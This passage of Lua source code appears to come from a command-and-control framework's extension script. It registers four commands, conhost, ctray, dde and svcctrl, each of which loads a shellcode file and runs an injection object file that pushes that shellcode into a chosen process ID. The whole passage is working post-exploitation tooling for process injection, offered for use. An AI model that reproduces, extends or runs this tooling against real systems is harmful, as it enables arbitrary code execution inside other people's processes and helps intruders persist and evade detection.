    if shellcode_file == "" then error("Invalid shellcode file") end
    local shellcode_file_handle = io.open(shellcode_file, "rb")
    if not shellcode_file_handle then
        print("shellcode_file not found")
        return nil
    end
    local shellcode = shellcode_file_handle:read("*all")
    shellcode_file_handle:close()
    local pack_args = bof_pack("ib", pid, shellcode)
    local bof_path = "RemoteOPsBOF/Inject/conhost/conhost" .. "." ..
                         session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), pack_args, true)
end
local command_conhost = command("remote:conhost", run_conhost,
                                "remote conhost --pid <pid> --shellcode_file <path2shellcode.bin>",
                                "")
command_conhost:Flags():Int64("pid", 0, "the process id to inject into")
command_conhost:Flags():String("shellcode_file", "",
                               "the shellcode file to inject")

-- ctray
local function run_ctray(cmd, args)
    local pid = cmd:Flags():GetInt64("pid")
    local shellcode_file = cmd:Flags():GetString("shellcode_file")
    local session = active()
    if pid == 0 then error("Invalid PID") end
    if shellcode_file == "" then error("Invalid shellcode file") end
    local shellcode_file_handle = io.open(shellcode_file, "rb")
    if not shellcode_file_handle then
        print("shellcode_file not found")
        return nil
    end
    local shellcode = shellcode_file_handle:read("*all")
    shellcode_file_handle:close()
    local pack_args = bof_pack("ib", pid, shellcode)
    local bof_path =
        "RemoteOPsBOF/Inject/ctray/ctray" .. "." .. session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), pack_args, true)
end
local command_ctray = command("remote:ctray", run_ctray,
                              "remote ctray --pid <pid> --shellcode_file <path2shellcode.bin>",
                              "")
command_ctray:Flags():Int64("pid", 0, "the process id to inject into")
command_ctray:Flags():String("shellcode_file", "",
                             "the shellcode file to inject")

local function run_dde(cmd, args)
    local pid = cmd:Flags():GetInt64("pid")
    local shellcode_file = cmd:Flags():GetString("shellcode_file")
    local session = active()
    if pid == 0 then error("Invalid PID") end
    if shellcode_file == "" then error("Invalid shellcode file") end
    local shellcode_file_handle = io.open(shellcode_file, "rb")
    if not shellcode_file_handle then
        print("shellcode_file not found")
        return nil
    end
    local shellcode = shellcode_file_handle:read("*all")
    shellcode_file_handle:close()
    local pack_args = bof_pack("ib", pid, shellcode)
    local bof_path = "RemoteOPsBOF/Inject/dde/dde" .. "." .. session.Os.Arch ..
                         ".o"
    return bof(session, script_resource(bof_path), pack_args, true)
end
local command_dde = command("remote:dde", run_dde,
                            "remote dde --pid <pid> --shellcode_file <path2shellcode.bin>",
                            "")
command_dde:Flags():Int64("pid", 0, "the process id to inject into")
command_dde:Flags():String("shellcode_file", "", "the shellcode file to inject")

local function run_svcctrl(cmd, args)
    local pid = cmd:Flags():GetInt64("pid")
    local shellcode_file = cmd:Flags():GetString("shellcode_file")
    local session = active()
    if pid == 0 then error("Invalid PID") end
    if shellcode_file == "" then error("Invalid shellcode file") end
    local shellcode_file_handle = io.open(shellcode_file, "rb")
    if not shellcode_file_handle then
        print("shellcode_file not found")
        return nil
    end
    local shellcode = shellcode_file_handle:read("*all")
    shellcode_file_handle:close()
    local pack_args = bof_pack("ib", pid, shellcode)
    local bof_path = "RemoteOPsBOF/Inject/svcctrl/svcctrl" .. "." ..
                         session.Os.Arch .. ".o"
    return bof(session, script_resource(bof_path), pack_args, true)
end
local command_svcctrl = command("remote:svcctrl", run_svcctrl,
                                "remote svcctrl --pid <pid> --shellcode_file <path2shellcode.bin>",
                                "")
command_svcctrl:Flags():Int64("pid", 0, "the process id to inject into")
command_svcctrl:Flags():String("shellcode_file", "",
                               "the shellcode file to inject")
